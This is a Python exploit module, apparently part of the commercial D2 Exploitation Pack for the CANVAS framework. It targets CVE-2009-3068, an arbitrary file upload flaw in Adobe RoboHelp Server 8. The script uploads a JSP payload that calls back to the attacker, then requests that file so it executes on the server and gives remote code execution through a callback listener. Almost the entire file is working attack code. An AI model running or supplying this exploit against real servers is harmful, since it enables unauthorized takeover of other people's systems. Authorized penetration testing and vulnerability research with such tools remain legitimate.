#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2009
#

import sys
import time
import os
import random

from urllib import urlopen
from sgmllib import SGMLParser

sys.path.append(".")
sys.path.append("../../")

import canvasengine

from exploitutils import *
from tcpexploit import tcpexploit
from httplib import HTTPConnection, HTTPSConnection

# GUI info
NAME = "Adobe RoboHelp Server Arbitrary File Upload and Execute Vulnerability"

DESCRIPTION = "Arbitrary File Upload and Execute Vulnerability in Adobe RoboHelp Server"

DOCUMENTATION = {}
DOCUMENTATION["VENDOR"] = "Adobe"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["Versions Affected"] = "RoboHelp Server 8"
DOCUMENTATION["Date public"] = "2009.09.18"
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-09-066"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["CVE Name"] = "CVE-2009-3068"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3068"
DOCUMENTATION["Notes"] = ""

VERSION = '1.0'

GTK2_DIALOG = 'dialog.glade2'

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]

NOTES="""
Start converttomosdef to get a MOSDEF node from the JAVA node.
"""

CHANGELOG="""
"""


class theexploit (tcpexploit):
    
  def __init__(self):
    tcpexploit.__init__(self)
    self.host = ""    
    self.filename = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_robohelp/d2.jsp"    
    self.port = 8080
    self.https = 0
    self.name = NAME
    return

  def neededListenerTypes(self):
    return [canvasengine.JAVASERVER]
	
  def upload_file(self):
  
    f = open(self.filename, "r")
    data = f.read()
    f.close()
    
    data = data.replace("CALLBACK_IP", self.callback.ip)
    data = data.replace("CALLBACK_PORT", str(self.callback.port))
    
    try:					
      if self.https == 0:
      	cnx = HTTPConnection(self.host, self.port)
      else:
      	cnx = HTTPSConnection(self.host, self.port)
      
      # Upload JSP file            
      url = "/robohelp/server?PUBLISH=" + str(random.randint(1, 100))
      headers = {'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)', 'Content-Type':'multipart/form-data; boundary=---------------------------111', 'UID':'1234'}

      param  = "-----------------------------D2BOUND\r\n"
      param += "Content-Disposition: form-data; name=\"filename\"; filename=\"d2.jsp\"\r\n"
      param += "Content-Type: application/x-java-archive\r\n\r\n"
      param += data
      param += "\r\n"
      param += "-----------------------------D2BOUND--\r\n"            
      
      cnx.request("POST", url, param, headers)			
      resp = cnx.getresponse()
     
      hdr = resp.getheaders()
      
      for h in hdr:
        if (h[0] == "sessionid"):
          id = h[1]          
            
      # Execute uploaded JSP file
      url = "/robohelp/robo/reserved/web/%s/d2.jsp" % (id)
      cnx.request("GET", url, None, {'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)'})			  
      cnx.close()            
      
    except:
      self.log("HTTP(S) error")
      return 0
      		
    return 1

  def getargs(self):	
    self.host = self.target.interface
    self.port = int(self.argsDict.get("port", self.port)) 
    self.https = int(self.argsDict.get("https", self.https))  

  def run(self):
    self.getargs()
    self.setInfo("%s attacking %s"%(NAME,self.host))
 
    ret = self.upload_file()
    
    self.setInfo("%s attacking %s - done"%(NAME, self.host))
    
    return ret

  def usage(self):
    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
    sys.exit(0)
    
if __name__ == '__main__':
  print "Running CANVAS %s v %s" % (NAME, VERSION)
  app = theexploit()
  ret = standard_callback_commandline(app)
